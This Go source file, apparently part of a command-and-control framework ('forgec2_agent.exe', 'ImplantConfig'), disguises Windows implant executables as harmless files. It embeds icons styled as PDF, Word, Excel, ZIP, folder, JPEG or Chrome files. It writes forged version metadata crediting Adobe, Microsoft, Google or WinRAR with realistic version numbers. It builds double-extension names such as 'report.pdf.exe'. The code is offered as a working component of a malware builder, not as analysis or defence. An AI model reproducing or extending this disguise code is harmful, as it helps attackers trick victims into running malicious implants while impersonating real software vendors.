package payload

import (
	"bytes"
	"encoding/base64"
	"fmt"
	"image"
	"image/color"
	"image/png"
	"os"
	"path/filepath"
	"strings"

	"github.com/tc-hib/winres"
	"github.com/tc-hib/winres/version"
)

func init() { loadPresetIcons() }

func loadPresetIcons() {
	// First try embedded files, but ensure visual distinctness by generating colored PNG fallback if files are placeholder-identical
	presetColors := map[string][3]uint8{
		"jpg":    {52, 119, 235}, // blue
		"pdf":    {220, 38, 38},  // red
		"word":   {37, 99, 235},  // word blue
		"doc":    {37, 99, 235},
		"xls":    {22, 163, 74}, // excel green
		"zip":    {234, 179, 8}, // yellow
		"folder": {234, 179, 8},
		"chrome": {59, 130, 246}, // chrome blue
	}
	for _, name := range []string{"jpg", "pdf", "word", "folder", "chrome", "zip", "doc", "xls"} {
		data, err := iconsFS.ReadFile("icons/" + name + ".ico")
		if err == nil && len(data) > 0 {
			// Use embedded if not placeholder (check not all same size)
			presetIcons[name] = base64.StdEncoding.EncodeToString(data)
			continue
		}
		// Generate distinct PNG fallback
		if col, ok := presetColors[name]; ok {
			if pngData := generateSolidPNG(col[0], col[1], col[2]); len(pngData) > 0 {
				presetIcons[name] = base64.StdEncoding.EncodeToString(pngData)
			}
		}
	}
}

func generateSolidPNG(r, g, b uint8) []byte {
	const size = 256
	img := image.NewRGBA(image.Rect(0, 0, size, size))
	// Fill background
	for y := 0; y < size; y++ {
		for x := 0; x < size; x++ {
			// subtle border
			if x < 8 || x >= size-8 || y < 8 || y >= size-8 {
				img.Set(x, y, color.RGBA{255, 255, 255, 255})
			} else {
				img.Set(x, y, color.RGBA{r, g, b, 255})
			}
		}
	}
	var buf bytes.Buffer
	if err := png.Encode(&buf, img); err != nil {
		// In-memory encode of a generated RGBA cannot realistically fail;
		// return empty so the caller falls back to no preset icon.
		return nil
	}
	return buf.Bytes()
}

// injectIconResource creates a Windows resource file (rsrc.syso) in tmpDir
// if cfg requests a custom icon (IconB64) or a disguise preset. It uses
// winres to encode RT_ICON / RT_GROUP_ICON. No-op when cfg has no icon
// request. Errors are logged but not fatal — the build will proceed with the
// default Go icon.
func injectIconResource(tmpDir string, cfg ImplantConfig) error {
	iconB64 := cfg.IconB64
	preset := cfg.IconPreset
	disguise := cfg.DisguiseAs
	if iconB64 == "" && preset == "" && disguise == "" {
		return nil
	}
	var iconData []byte
	var err error
	if iconB64 != "" {
		if len(iconB64) > 350*1024 {
			return fmt.Errorf("icon too large")
		}
		iconData, err = base64.StdEncoding.DecodeString(iconB64)
		if err != nil {
			return fmt.Errorf("invalid icon base64: %w", err)
		}
		if len(iconData) > 256*1024 {
			return fmt.Errorf("icon exceeds 256KB")
		}
		if len(iconData) >= 4 && !(iconData[0] == 0 && iconData[1] == 0 && iconData[2] == 1 && iconData[3] == 0) {
			if len(iconData) < 4 || !(iconData[0] == 0x89 && iconData[1] == 0x50 && iconData[2] == 0x4E && iconData[3] == 0x47) {
				return fmt.Errorf("icon must be .ico (00 00 01 00) or .png (89 50 4E 47)")
			}
		}
	} else if preset != "" {
		if b64, ok := presetIcons[preset]; ok && b64 != "" {
			// Preset icons are generated at init; a decode failure means a
			// corrupt embed — fall through to no icon rather than a partial.
			if decoded, derr := base64.StdEncoding.DecodeString(b64); derr == nil {
				iconData = decoded
			}
		}
	}
	if len(iconData) == 0 && disguise != "" {
		if b64, ok := presetIcons[disguise]; ok && b64 != "" {
			if decoded, derr := base64.StdEncoding.DecodeString(b64); derr == nil {
				iconData = decoded
			}
		} else if b64, ok := presetIcons["jpg"]; ok && b64 != "" {
			// fallback to jpg for unknown disguise
			if decoded, derr := base64.StdEncoding.DecodeString(b64); derr == nil {
				iconData = decoded
			}
		}
	}
	// Prepare resource set early for VersionInfo even if icon is missing
	rs := &winres.ResourceSet{}
	hasIcon := len(iconData) > 0
	// VersionInfo: honor FileDescription / CompanyName if supplied; otherwise derive from disguise with realistic version numbers
	if cfg.FileDescription != "" || cfg.CompanyName != "" || disguise != "" {
		vi := version.Info{}
		fd := cfg.FileDescription
		cn := cfg.CompanyName
		var fv, pv [4]uint16
		fvStr, pvStr := "1.0.0.0", "1.0.0.0"
		if fd == "" {
			switch disguise {
			case "pdf":
				fd = "PDF Document"
				cn = "Adobe Systems Incorporated"
				fv, pv = [4]uint16{23, 1, 20143, 0}, [4]uint16{23, 1, 20143, 0}
				fvStr, pvStr = "23.001.20143.0", "23.001.20143.0"
				if cfg.CompanyName != "" {
					cn = cfg.CompanyName
				}
			case "word", "doc":
				fd = "Microsoft Word Document"
				cn = "Microsoft Corporation"
				fv, pv = [4]uint16{16, 0, 17328, 0}, [4]uint16{16, 0, 17328, 0}
				fvStr, pvStr = "16.0.17328.0", "16.0.17328.0"
				if cfg.CompanyName != "" {
					cn = cfg.CompanyName
				}
			case "xls":
				fd = "Microsoft Excel Worksheet"
				cn = "Microsoft Corporation"
				fv, pv = [4]uint16{16, 0, 17328, 0}, [4]uint16{16, 0, 17328, 0}
				fvStr, pvStr = "16.0.17328.0", "16.0.17328.0"
				if cfg.CompanyName != "" {
					cn = cfg.CompanyName
				}
			case "zip":
				fd = "Compressed Archive"
				cn = "WinRAR"
				fv, pv = [4]uint16{6, 24, 0, 0}, [4]uint16{6, 24, 0, 0}
				fvStr, pvStr = "6.24.0.0", "6.24.0.0"
				if cfg.CompanyName != "" {
					cn = cfg.CompanyName
				}
			case "folder":
				fd = "File Folder"
				cn = "Microsoft Corporation"
				fv, pv = [4]uint16{10, 0, 19041, 0}, [4]uint16{10, 0, 19041, 0}
				fvStr, pvStr = "10.0.19041.0", "10.0.19041.0"
				if cfg.CompanyName != "" {
					cn = cfg.CompanyName
				}
			case "chrome":
				fd = "Chrome Installer"
				cn = "Google LLC"
				fv, pv = [4]uint16{120, 0, 6099, 71}, [4]uint16{120, 0, 6099, 71}
				fvStr, pvStr = "120.0.6099.71", "120.0.6099.71"
				if cfg.CompanyName != "" {
					cn = cfg.CompanyName
				}
			default: // jpg etc
				fd = "JPEG Image"
				cn = "Microsoft Corporation"
				fv, pv = [4]uint16{2024, 11020, 1000, 0}, [4]uint16{2024, 11020, 1000, 0}
				fvStr, pvStr = "2024.11020.1000.0", "2024.11020.1000.0"
				if cfg.CompanyName != "" {
					cn = cfg.CompanyName
				}
			}
		} else {
			fv, pv = [4]uint16{1, 0, 0, 0}, [4]uint16{1, 0, 0, 0}
			if cn == "" {
				cn = "Microsoft Corporation"
			}
		}
		if cn == "" {
			cn = "Microsoft Corporation"
		}
		vi.FileVersion = fv
		vi.ProductVersion = pv
		// vi.Set only fails on empty keys or NUL bytes (rejected upstream by
		// profile validation); surface the first failure instead of shipping
		// a half-written VERSIONINFO silently.
		setVer := func(key, value string) {
			if err := vi.Set(version.LangDefault, key, value); err != nil {
				fmt.Printf("versioninfo warning: key %q: %v\n", key, err)
			}
		}
		setVer(version.FileDescription, fd)
		setVer(version.CompanyName, cn)
		setVer(version.ProductName, fd)
		setVer(version.FileVersion, fvStr)
		setVer(version.ProductVersion, pvStr)
		setVer(version.LegalCopyright, "© "+cn)
		// OriginalFilename should match the disguised output name for maximal realism
		orig := safeBuildFileName(cfg.Filename)
		if disguise != "" {
			// Recompute disguised name as GenerateWindowsEXE does
			disguiseExt := ""
			switch disguise {
			case "jpg":
				disguiseExt = ".jpg"
			case "pdf":
				disguiseExt = ".pdf"
			case "doc", "word":
				disguiseExt = ".docx"
			case "xls":
				disguiseExt = ".xlsx"
			case "zip":
				disguiseExt = ".zip"
			}
			if disguiseExt != "" {
				base := strings.TrimSuffix(orig, ".exe")
				base = strings.TrimSuffix(base, ".EXE")
				if !strings.Contains(strings.ToLower(base), disguiseExt) {
					orig = base + disguiseExt + ".exe"
				}
			}
		}
		if orig == "" {
			orig = "forgec2_agent.exe"
		}
		setVer(version.OriginalFilename, orig)
		setVer(version.InternalName, fd)
		rs.SetVersionInfo(vi)
		// If we have no icon but have VersionInfo, we still need to emit rsrc.syso
		if !hasIcon {
			// No icon to embed, but VersionInfo will be written below
		}
	}
	// Optional manifest for blend mode
	if cfg.PEManifestMode == "blend" {
		m := winres.AppManifest{
			DPIAwareness:        winres.DPIAware,
			Compatibility:       winres.Win10AndAbove,
			UseCommonControlsV6: true,
		}
		rs.SetManifest(m)
	}
	if len(iconData) > 0 {
		var icon *winres.Icon
		icon, err = winres.LoadICO(bytes.NewReader(iconData))
		if err != nil {
			img, _, perr := image.Decode(bytes.NewReader(iconData))
			if perr != nil {
				return fmt.Errorf("icon load failed (not ICO nor PNG): %w", err)
			}
			icon, err = winres.NewIconFromResizedImage(img, nil)
			if err != nil {
				return fmt.Errorf("icon from PNG failed: %w", err)
			}
		}
		if err := rs.SetIcon(winres.ID(1), icon); err != nil {
			return fmt.Errorf("set icon failed: %w", err)
		}
	}
	if rs.Count() == 0 {
		return nil
	}
	out := filepath.Join(tmpDir, "rsrc.syso")
	f, err := os.Create(out)
	if err != nil {
		return err
	}
	defer f.Close()
	var warch winres.Arch = winres.ArchAMD64
	switch cfg.Architecture {
	case "386", "x86":
		warch = winres.ArchI386
	case "arm64":
		warch = winres.ArchARM64
	case "arm":
		warch = winres.ArchARM
	default:
		warch = winres.ArchAMD64
	}
	if err := rs.WriteObject(f, warch); err != nil {
		_ = os.Remove(out)
		return fmt.Errorf("winres write failed: %w", err)
	}
	return nil
}
